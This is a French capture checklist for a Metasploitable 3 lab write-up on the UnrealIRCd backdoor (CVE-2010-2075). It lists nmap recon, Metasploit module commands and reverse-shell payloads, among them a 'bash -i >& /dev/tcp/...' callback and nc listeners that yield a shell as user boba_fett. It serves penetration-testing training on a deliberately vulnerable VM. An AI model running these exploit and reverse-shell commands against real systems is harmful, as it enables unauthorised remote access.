# Captures — UnrealIRCd Backdoor (MS3)

Consignes de capture pour `services/ms3-unrealircd.html`. Commandes identiques à celles du
write-up source : `ms3/jules/unrealircd.md`.

## 01-recon-ssl.png

```bash
nmap -sC -sV -p 6697 172.28.128.3
openssl s_client -connect 172.28.128.3:6697
```

Encadrer en rouge : `wrong version number` (preuve que ce n'est pas réellement du TLS malgré
le port conventionnel).

## 02-recherche-module.png

```bash
searchsploit unrealircd
msfconsole -q -x "search unreal; exit"
msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"
```

Encadrer en rouge : `exploit/unix/irc/unreal_ircd_3281_backdoor` et `CVE-2010-2075`.

## 03-metasploit-echec.png

```bash
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 172.28.128.3; set RPORT 6697; set PAYLOAD cmd/unix/reverse_bash; set LHOST 172.28.128.1; set LPORT 4470; exploit -z; sleep 35; sessions -l; exit -y"
```

Encadrer en rouge : `The target appears to be vulnerable` **et** `Exploit completed, but no
session was created` juste en dessous — le contraste entre les deux lignes est le point
important de cette capture.

## 04-manuel-delay.png

Script Python (voir write-up, section 5) gardant la socket ouverte 35s, avec `nc -lvnp` en
écoute côté Kali.

Encadrer en rouge : `uid=1121(boba_fett)` dans la sortie `nc`.

## 05-shell-interactif.png

Script Python envoyant le payload `bash -c 'bash -i >& /dev/tcp/172.28.128.1/4472 0>&1'`,
toujours avec le même délai de 35s.

Encadrer en rouge : le prompt `boba_fett@metasploitable3-ub1404:...$` obtenu côté `nc`.
